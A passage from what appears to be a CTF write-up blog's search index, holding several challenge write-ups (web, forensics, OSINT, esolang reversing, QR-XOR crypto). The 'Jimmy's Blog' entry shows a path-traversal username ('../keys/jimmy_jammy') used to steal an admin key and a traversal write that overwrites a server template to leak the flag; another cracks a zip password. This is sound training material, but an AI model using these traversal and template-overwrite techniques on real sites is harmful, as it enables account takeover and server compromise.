Mem"},{"content":"Challenge Hard\nDescription: The technology is always evolving, so why do we still stick with password-based authentication? That makes no sense! That’s why I designed my own password-less login system. I even open-sourced it for everyone interested, how nice of me!\nMe (@1nk0x01) and (@0_Zero_0) solved this challenge together.\nwe were given a website link and the challenge (\u0026quot;Source Code\u0026quot;)\nwe went to the website to take a look at what it does and it is a blog for someone named Jimmy\nwith Login, Register and Article Page.\nNvm, we read those articles to know what Jimmy published in his Blog\nits basically an authentication system without needing a password\njust a username and the site automatically generates an encryption key for you to be able to login.\nthat is the main idea \\ next step is to check the site but in a dynamic way try it i mean, so we basically went to register page and created an account with username hecker :/:\nas you see it generated a key with the name we typed with .key ext\nwe tried to make another account with the same username but nope it said username already taken xd\nalso we tried to read this key but wasn\u0026rsquo;t useful, next step is to try the login\nit asks for the username and the access key were given while creating your account.\nafter we logged in just the same article page and Logout button lol?\nwe noticed that there is nothing interesting here, so we moved to the source code\nwe fired node to run the blog locally we started the fight :D\nwe read the basic main files [ run.sh, note.txt, nginx.conf, Dockerfile ]\nnope nothing there, so let\u0026rsquo;s review the juicy javascript code xd\nwe started with index.js it just routing the requests /login, /register..etc\nbut But there was something that caught my attention | those two functions\n1- Show the content of the articles but you should be an admin\nedit.js\napp.get(\u0026quot;/edit\u0026quot;, (req, res) =\u0026gt; { if (!req.session.admin) return res.sendStatus(401); const id = parseInt(req.query.id).toString(); const article_path = path.join(\u0026quot;articles\u0026quot;, id); try { const article = fs.readFileSync(article_path).toString(); res.render(\u0026quot;edit\u0026quot;, { article: article, session: req.session, flag: process.env.FLAG }); } catch { res.sendStatus(404); } }) first one is check if there is a session admin to be able to see the content the edit articles as you see there is flag: process.env.FLAG being render\n2- Edit The Content of the articles\napp.post(\u0026quot;/edit\u0026quot;, (req, res) =\u0026gt; { if (!req.session.admin) return res.sendStatus(401); try { fs.writeFileSync(path.join(\u0026quot;articles\u0026quot;, req.query.id), req.body.article.replace(/\\r/g, \u0026quot;\u0026quot;)); res.redirect(\u0026quot;/\u0026quot;); } catch { res.sendStatus(404); } })\tit\u0026rsquo;s an endpoint only admins can access it to edit the articles without filtering the content so that means we can found path traversal vulnerability via parameter id, so how can we be admins?\u0026hellip; fine let\u0026rsquo;s continue reading the code\nso next file was this edit.ejs of course to see how this file prints the flag | nothing was interested but one thing was\nedit.js\n\u0026lt;!doctype html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;%- include('head.ejs') %\u0026gt; \u0026lt;body class=\u0026quot;text-dark bg-light\u0026quot;\u0026gt; \u0026lt;%- include('navbar.ejs') %\u0026gt; \u0026lt;div class=\u0026quot;container my-5 px-5\u0026quot;\u0026gt; \u0026lt;h3 class=\u0026quot;text-center\u0026quot;\u0026gt;Welcome jimmy_jammy, your flag is\u0026lt;/h3\u0026gt; \u0026lt;p class=\u0026quot;mb-5 text-center\u0026quot;\u0026gt;\u0026lt;%= flag %\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;h3\u0026gt;Meanwhile, please feel free to edit your article\u0026lt;/h3\u0026gt; \u0026lt;form method=\u0026quot;POST\u0026quot;\u0026gt; \u0026lt;textarea class=\u0026quot;form-control mb-3\u0026quot; rows=\u0026quot;15\u0026quot; name=\u0026quot;article\u0026quot;\u0026gt;\u0026lt;%= article %\u0026gt;\u0026lt;/textarea\u0026gt; \u0026lt;button type=\u0026quot;submit\u0026quot; class=\u0026quot;btn btn-dark w-100\u0026quot;\u0026gt;Save Changes\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;%- include('scripts.ejs') %\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; html tag with \u0026lt;h3\u0026gt; Welcome jimmy_jammy\u0026lt;/h3\u0026gt;\nwe realized that this the admin name because the blog named jimmy\u0026rsquo;s blog so this 90% the admin username next step is to find a way to login in as jimmy_jammy.\nso we started see the main authentication files (register.ejs, login.ejs)\nand the common file in all files was (utils.js) so we started with it\nutils.js is contains the main functions of Database inserting users, login check\nthere is username registered jimmy_jammy and admin value is 1\nif you noticed that in register function admin = 0 for normal users\nline 21 it looks like the script is not filtering the value so why we don\u0026rsquo;t give a try for path traversal vulnerability. :::\nso why we don\u0026rsquo;t give it a try to register but using the vulnerability on our side\nlet\u0026rsquo;s get into the first exploit:\nFirst step creating a user with this username to get the key of the admin ( jimmy_jammy ) =\u0026gt; username: ../keys/jimmy_jammy Great, we got the admin\u0026rsquo;s encryption key now we can login as the admin |^:^/\nCool!, since we became admins, so we can view edit page and get our flag!,\nHuh? is that my flag really? nvm we checked all files but we returned back to see if we missed something and yeah we missed the ngnix.conf file\nngnix.conf\nserver { listen 80 default_server; listen [::]:80 default_server; server_name _; location / { # Replace the flag so nobody steals it! sub_filter 'placeholder_for_flag' 'oof, that was close, glad i was here to save the day'; sub_filter_once off; proxy_pass http://localhost:3000; } } Oops, Flag is being replaced # Replace the flag so nobody steals it!\nsub_filter 'placeholder_for_flag' 'oof, that was close, glad i was here to save the day';\nso we can\u0026rsquo;t continue locally\nNote: Don\u0026rsquo;t forget we have a path traversal in edit page via id parameter.\nwhile writeFileSyncwhich()allows us to re-write the file content to whatever we want so why we don\u0026rsquo;t get a Nice RCE :D\nvia SSTI (Server Side Template Injection) we can determine the vulnerability by following this endpoint ?id=../views/article.ejs\nactually i forgot to take a screenshot of the SSTI but trust me it is vulnerable :DD\nlet\u0026rsquo;s continue after we determined the vuln exists next move is to get RCE\nbut instead of this we will force the server to print the flag in all articles pages\nby overriding the article file with the following code\n\u0026lt;!doctype html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;%- include('head.ejs') %\u0026gt; \u0026lt;body class=\u0026quot;text-dark bg-light\u0026quot;\u0026gt; \u0026lt;%- include('navbar.ejs') %\u0026gt; \u0026lt;div class=\u0026quot;container my-5 px-5\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;card mb-4\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;card-header\u0026quot;\u0026gt; \u0026lt;%= article.date %\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026quot;card-body\u0026quot;\u0026gt; \u0026lt;h5 class=\u0026quot;card-title\u0026quot;\u0026gt;\u0026lt;%= article.title %\u0026gt;\u0026lt;/h5\u0026gt; \u0026lt;p class=\u0026quot;card-text\u0026quot;\u0026gt; \u0026lt;%= article.summary %\u0026gt; \u0026lt;hr class=\u0026quot;mb-0\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;pre-line\u0026quot;\u0026gt; \u0026lt;%= article.content %\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026quot;card-footer text-muted\u0026quot;\u0026gt; \u0026lt;% for (var i =1; i \u0026lt;=59; i++ ) { %\u0026gt; \u0026lt;% flag[i] %\u0026gt; \u0026lt;% } %\u0026gt; Pwned by b4Rabb1t$ \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;%- include('scripts.ejs') %\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; so we intercepted the request while we editing any article and we used the id parameter and then we encoded our js payload as a url-encoded and we replaced article value to our script\nand we forwarded the request and guess!\nBingo! We got the Jimmy Challenge Thanks For REading..!\n","permalink":"https://r1ddll3.github.io/ctfs/blackhatmea/web/jimmy/","summary":"Challenge Hard\nDescription: The technology is always evolving, so why do we still stick with password-based authentication? That makes no sense! That’s why I designed my own password-less login system. I even open-sourced it for everyone interested, how nice of me!\nMe (@1nk0x01) and (@0_Zero_0) solved this challenge together.\nwe were given a website link and the challenge (\u0026quot;Source Code\u0026quot;)\nwe went to the website to take a look at what it does and it is a blog for someone named Jimmy","title":"BlackHatMEA | Jimmy's Blog"},{"content":" Challenge Name: Filterition-2\nPoints: 200\nLet\u0026rsquo;s get started, given a (“pcapng”) so let\u0026rsquo;s take a overall look first and get in deep later. messy requests :D | but the name of the challenge is Filterition\nso i have to filter the requests\ni started filtering the requests, started with dns requests but nothing was interesting. i took a look at tcp requests and i couldn\u0026rsquo;t see the requests well so i thought that there is nothing useful :D\nnow time to check the ftp requests using this wireshark filter ( ftp-data ) and there i got a very interested thing.\nit is a zip file cool let\u0026rsquo;s dig in.. i exported the file. now i have a zip file looks interesting but it is protected with password :( | ofc i will brute force it . i used zip2john to crack the password |\nthe password is : labeba BoOoOM am done :*\nsry but nope i got file named secret_data.txt contains some codes\nactually i have no clue what are they :(\ni copied one random code and pasted it to google and i figured that those codes are RGB Codes and i noticed that also from the Name of the pcap file ( colurfull.pcapng )\nnow i need a way to convert those RGB Codes to image to be able to see the flag, it was an easy thing for me cause i solved chall like these before\nso i made a little python script to take all RGB Colors and convert it to image like magic :D\nfrom PIL import Image w,h = 289, 500 rgbFile = open('secret_data.txt', 'r') data = rgbFile.readlines() rgblist = [] for v in data: j = v.strip() k = v.split(\u0026quot;-\u0026quot;) rgb = (int(k[0]),int(k[1]),int(k[2])) rgblist.append(rgb) im = Image.new(\u0026quot;RGB\u0026quot;, (w, h)) im.putdata(rgblist) im.save(\u0026quot;flag.png\u0026quot;) print(\u0026quot;Bingo!\u0026quot;) i made the width 289 based on the trials i did so i figured that the best width to show the flag correctly \\o/\nand finally i got the flag\nJISCTF{EXF1LT3R4T3D_D4T4_1N_1M4G3_F1L3}\nThanks For Reading..\n","permalink":"https://r1ddll3.github.io/ctfs/ctfjordan-2022/forensics/filterition-2/","summary":"Challenge Name: Filterition-2\nPoints: 200\nLet\u0026rsquo;s get started, given a (“pcapng”) so let\u0026rsquo;s take a overall look first and get in deep later. messy requests :D | but the name of the challenge is Filterition\nso i have to filter the requests\ni started filtering the requests, started with dns requests but nothing was interesting. i took a look at tcp requests and i couldn\u0026rsquo;t see the requests well so i thought that there is nothing useful :D","title":"CTFJordan-2022 | Filterition-2"},{"content":" Challenge Name: OSINT - Pay Your Ransom\nPoints: 600\nLevel: Medium\nDescription: One of our customer\u0026rsquo;s computers was infected with ransomware, but we were unable to determine the ransomware family. Because of this, we have uploaded the ransom note to you in the hopes that you will be able to assist us in determining the ransomware family and discovering the key to decrypting and restoring the data.\nSo let\u0026rsquo;s get started\u0026hellip;. while i was solving a Web Challenge my team were solving this challenge\nbut they called me when they stucked in a Github Site .drvirux0.github.io, after i came i saw this blue screen from the github repo and it has a pastebin link and Base64 encoded\nactually this a ransomware ran on a PC, nevermind let\u0026rsquo;s investigate.. i saw the source code and i notiaced an html comment \u0026lt;!-- this is and base64 megan35 algorithm --\u0026gt; so i used cyberchef ofc to decode it and i got this result\ni went to this pastebin link .Pastebin but its protected with a password BTW the email that was mentioned in github was useless, but let\u0026rsquo;s continue.. i went back to github site after i got pastebin link and i readed it with focus and i noticed this sentence ```\n1 when you pay you will get your TLSH hash please submit it here to get your secret : https://pastebin.com/JE8sB3eT. this the same link from previous encoded :) but the important part was mentioned that i need to get something called TLSH hash to be able to use it as a password to un-lock the pastebin.\nhmm, how do i get it then and i dunno even how to start look for it, so i decided to make a steps i follow like a sequence for me\n1- i need to know the name of this ransomware\n2- once i know the name, i need to figure out how can i get the TLSH hash\nmy friends were trying in different ways but they all failed, but i got an idea, i took a screenshot for the ransomware without showing anything but the message and i searched in google image hopefully find anything interested. i got a tweet that has the same screenshot of the ransomware .Twitter\nSo now i have the name of this ransomware ( chacha ) and the MD5 hash, next step is looking in Virustotal using this MD5 hash :* and i found there is a malware exists |^:^|\nVirustotal Result now i need to get the TLSH Hash, by going to the Details section i got what i want\ni went to pastebin as fast and i typed it and i got message password should contain at most 64 chars, wait what!!!! WT,F is going on\ni got an idea to split the TLSH Hash and get the first 64 Characters only using a little Python script\n1 2 string=\u0026#34;T1CAA402127AE7A0B1D8BB427359648E964B3EFE654F218EC733C8464D06B56C05B32F63\u0026#34; print(string[:64]) and it worked, hell yeah ! and this what was inside\nThe Message says:\n1 2 3 4 5 https://pastebin.com/uyg8hdhY Please take note that this ransomware generates a database file with the name foo. db this file has SHA-1 hash, and in order for you to open the bin that was mentioned earlier, you will need to obtain this hash. Another Puzzle so let\u0026rsquo;s get deeper, ofc this second pastebin was protected too but the message says ransomware generates a db file with name foo.db and the sha-1 of this file/db will be the password for the flag so i went back to virustotal looking for any something that related to this db and i got something in behavior section\nthere are dropped files hmmm this what i\u0026rsquo;m looking for\u0026hellip; i opened Dr.Web to see to these files.\ndb file is there and the SHA-1 too cool\ni used it as a password and i finally got the Flag\nFLAG: ASCWG{V1rUs_7Ot4L_$UPeR_5aYaN}\n","permalink":"https://r1ddll3.github.io/ctfs/ascwg-finals-2022/osint/payransom/","summary":"Challenge Name: OSINT - Pay Your Ransom\nPoints: 600\nLevel: Medium\nDescription: One of our customer\u0026rsquo;s computers was infected with ransomware, but we were unable to determine the ransomware family. Because of this, we have uploaded the ransom note to you in the hopes that you will be able to assist us in determining the ransomware family and discovering the key to decrypting and restoring the data.\nSo let\u0026rsquo;s get started\u0026hellip;.","title":"ASCWG-Finals-2022 | OSINT"},{"content":"Chicken - REverse-Engineering ===================== Description: So I tried learning a new sorta-language, but I\u0026rsquo;m not very good at it and don\u0026rsquo;t think I used it right. Can you check for me?\nChallenge is a file named chicken.chn i opened it in VSCode\nOpps, i don\u0026rsquo;t know what is this chicken lol?..\nso google is my friend atm, after searching in different ways i found that chicken esolang known as (shockingly) Reference.\neach line has the word \u0026ldquo;chicken\u0026rdquo; written a certain number of times.\nand that means when count the number of chicken on each line you will\nget a something called opcode Nvm Skip this part let\u0026rsquo;s get into our missions\ni searched for tool that can translate those lines to me automatically and i found a tool on github:\nGithubTool\nit translates the lines to be easier to read after i ran the tool and\ngot the result it was kinda easy to me now to read it and extract the flag\nchickenpy.VM - Storing 's' to 35 chickenpy.VM - Storing '3' to 15 chickenpy.VM - Storing '' to 12 chickenpy.VM - Storing 't' to 7 chickenpy.VM - Storing 'ˡ' to 24 chickenpy.VM - Storing '' to 36 chickenpy.VM - Storing 'e' to 19 chickenpy.VM - Storing '0' to 23 chickenpy.VM - Storing 'z' to 46 chickenpy.VM - Storing 'n' to 33 chickenpy.VM - Storing 'w' to 22 chickenpy.VM - Storing '3' to 17 chickenpy.VM - Storing '3' to 11 chickenpy.VM - Storing '' to 40 chickenpy.VM - Storing 'a' to 45 chickenpy.VM - Storing '0' to 30 chickenpy.VM - Storing 'f' to 5 chickenpy.VM - Storing 'r' to 14 chickenpy.VM - Storing 'l' to 31 chickenpy.VM - Storing 'n' to 20 chickenpy.VM - Storing '1' to 41 chickenpy.VM - Storing '3' to 9 chickenpy.VM - Storing '3' to 26 chickenpy.VM - Storing 'y' to 1 chickenpy.VM - Storing '4' to 13 chickenpy.VM - Storing 'c' to 3 chickenpy.VM - Storing '}' to 49 chickenpy.VM - Storing 's' to 29 chickenpy.VM - Storing 's' to 25 chickenpy.VM - Storing 'y' to 48 chickenpy.VM - Storing 'z' to 47 chickenpy.VM - Storing 'm' to 42 chickenpy.VM - Storing 't' to 4 chickenpy.VM - Storing '' to 27 chickenpy.VM - Storing 'r' to 10 chickenpy.VM - Storing 'h' to 8 chickenpy.VM - Storing 't' to 39 chickenpy.VM - Storing 'g' to 34 chickenpy.VM - Storing 'v' to 18 chickenpy.VM - Storing '' to 21 chickenpy.VM - Storing 'u' to 38 chickenpy.VM - Storing '' to 16 chickenpy.VM - Storing 'u' to 2 chickenpy.VM - Storing '_' to 43 chickenpy.VM - Storing '4' to 32 chickenpy.VM - Storing 'l' to 44 chickenpy.VM - Storing 'b' to 37 chickenpy.VM - Storing '{' to 6 chickenpy.VM - Storing 'e' to 28 chickenpy.VM - Storing 'b' to 0 Hmm, i noticed that every number represents a letter for example:\nchickenpy.VM - Storing 'b' to 0 storing 'b' to 0, so index number 0 is representing letter 'b' and so on like indexing in array we count from 0 i started to combine them from index 0 to the last index\nso since i start counting from 0 i will see if 0 matches the letter b cuz the flag is always starts with letter b and the flag pattern is byuctf{answer...} so if yes i will keep going to the next index and it matches letter y that means i am on the right track cuz next letter in the flag is y, i hope you understand this part xd\nonce i done collected the flag i submitted it but it said wrong flag\nbyuctf{th3r3_4r3_3ven_w01s3_es0l4ngs_but_1m_lazzy}\ni asked the support and they told me\nw01s3 not a word so i thought to replace the numbers with their\nnormal letters and translate it on google like this\n{there_are_even_woise_esolengs_but_im_lazzy} to see the meaning and\nto be able to know the correct word for w01s3 and i found out the correct one is w0rs3\nso i edited my flag and submitted it and\nBingo!! i got chicken Challenge\nFLAG: byuctf{th3r3_4r3_3ven_w0rs3_es0l4ngs_but_1m_lazzy}\nThanks For REading..\n","permalink":"https://r1ddll3.github.io/ctfs/byuctf/reverse/chicken/","summary":"Chicken - REverse-Engineering ===================== Description: So I tried learning a new sorta-language, but I\u0026rsquo;m not very good at it and don\u0026rsquo;t think I used it right. Can you check for me?\nChallenge is a file named chicken.chn i opened it in VSCode\nOpps, i don\u0026rsquo;t know what is this chicken lol?..\nso google is my friend atm, after searching in different ways i found that chicken esolang known as (shockingly) Reference.","title":"BYUCTF | Chicken"},{"content":"Me (@R1ddl3) and (0x3ashry) solved this challenge together Challenge Solution XQR was a hard rated cryptography challenge and it was in a whole another level.\nIt doesn’t contain except one massive image contain thousands of QR Codes\nI first tried to read the first QR Code but it gave me 85TK6eDfb{SXQfvR70VXX !!!\nthen i asked my friend to help me with any idea,\nThrough trials and errors we got that the size of each QR code is 27 pixels length and width, so we thought that cutting the whole image into smaller QR codes would help us to scan them\nwe made a python script to automate that.\nfrom PIL import Image imggg = Image.open('xqr.png') inc = 27 for i in range(0, 2727 , 27): for j in range(0, 2727, 27): box = (j, i, j+27, i+27) # left, top, right, buttom img2 = imggg.crop(box) img2.save(r'QRCodes/myimage_' + str(i) + '_' + str(j) + '_cropped.jpg') Now we have 10,201 QR Codes stored in folder called QRCodes, And we tried to scan them but wasn\u0026rsquo;t useful so we took a break for a while to think…\nThen my friend realized from the name of the challenge that XQR is near to XOR so what if we XORed all the QR Codes together…\nwe started with reading them using cv2 library from python-opencv and then in order to make our trick work\nwe changed the readed image to binary 0 and 1, black and white pixels. Then XORed each pixel with the same pixels in all the other 10,201 qr codes and saved it, Then displaying the final result:\nOur Python Code:\nimport cv2 import matplotlib.pyplot as plt import os imggg = Image.open('xqr.png') inc = 27 for i in range(0, 2727 , 27): for j in range(0, 2727, 27): box = (j, i, j+27, i+27) # left, top, right, buttom img2 = imggg.crop(box) img2.save(r'QRCodes/myimage_' + str(i) + '_' + str(j) + '_cropped.jpg') QR_dir = os.listdir(r\u0026quot;QRCodes\u0026quot;) qr_codes = [] for qr in QR_dir: gray = cv2.imread(\u0026quot;QRCodes/\u0026quot; + qr, cv2.COLOR_BGR2GRAY) _, binary = cv2.threshold(gray, 150, 1, cv2.THRESH_BINARY_INV) qr_codes.append(binary) for i in range(27): for j in range(27): for q in range(len(qr_codes)): if q+1 == 10201: break qr_codes[0][i][j] = int(qr_codes[0][i][j] != qr_codes[q+1][i][j]) plt.imshow(qr_codes[0]) plt.show() Scanning it…\nBingo !!! We got the flag\nFlag: byuctf{x0r_i5_u5eful}\nThanks For REading..\n","permalink":"https://r1ddll3.github.io/ctfs/byuctf/crypto/xqr/","summary":"Me (@R1ddl3) and (0x3ashry) solved this challenge together Challenge Solution XQR was a hard rated cryptography challenge and it was in a whole another level.\nIt doesn’t contain except one massive image contain thousands of QR Codes\nI first tried to read the first QR Code but it gave me 85TK6eDfb{SXQfvR70VXX !!!\nthen i asked my friend to help me with any idea,\nThrough trials and errors we got that the size of each QR code is 27 pixels length and width, so we thought that cutting the whole image into smaller QR codes would help us to scan them","title":"BYUCTF | XQR"}]